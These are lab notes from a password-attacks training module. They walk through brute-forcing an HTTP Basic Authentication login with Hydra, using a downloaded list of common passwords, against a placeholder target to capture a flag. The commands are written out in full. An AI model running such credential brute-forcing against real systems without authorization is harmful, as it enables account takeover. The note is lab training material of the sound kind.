# NOTE — Basic HTTP Authentication

## ID
514

## Module
Password Attacks

## Kind
notes

## Title
Section 7 — Basic HTTP Authentication

## Description
Use Hydra to brute‑force a password for a known username against a web endpoint protected with Basic HTTP Authentication, then log in to retrieve the flag.

## Tags
hydra, http-basic-auth, brute-forcing, web-attacks

## Commands
- `curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt`
- `hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt <TARGET_IP> http-get / -s <PORT>`

## What This Section Covers
Basic HTTP Authentication sends credentials in a Base64‑encoded `Authorization` header. This section walks through brute‑forcing a Basic Auth login using Hydra’s `http-get` module. The username (`basic-auth-user`) is already known, so only the password needs to be cracked. After Hydra finds the password, you log into the web page via browser to capture the flag.

## Methodology
1. **Spawn the target instance** — get the IP address and port.
2. **Download the password wordlist** — use `curl` to fetch `2023-200_most_used_passwords.txt` from SecLists.
3. **Run Hydra** — target the IP with `http-get /` on the specified port, using `-l basic-auth-user` and `-P` with the wordlist.
4. **Identify the correct password** — Hydra outputs the discovered password when found.
5. **Open the URL in a browser** — navigate to `http://<IP>:<PORT>/`, enter `basic-auth-user` and the cracked password, and retrieve the flag.

## Multi-step Workflow
```bash
# Download the wordlist (200 most used passwords of 2023)
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt

# Run Hydra against the target
# Replace <TARGET_IP> and <PORT> with your spawned instance details
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt <TARGET_IP> http-get / -s <PORT>

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|login-brute-forcing]]  
← [[06-hydra]] | [[08-hydra-http-post-form]] →
<!-- AUTO-LINKS-END -->
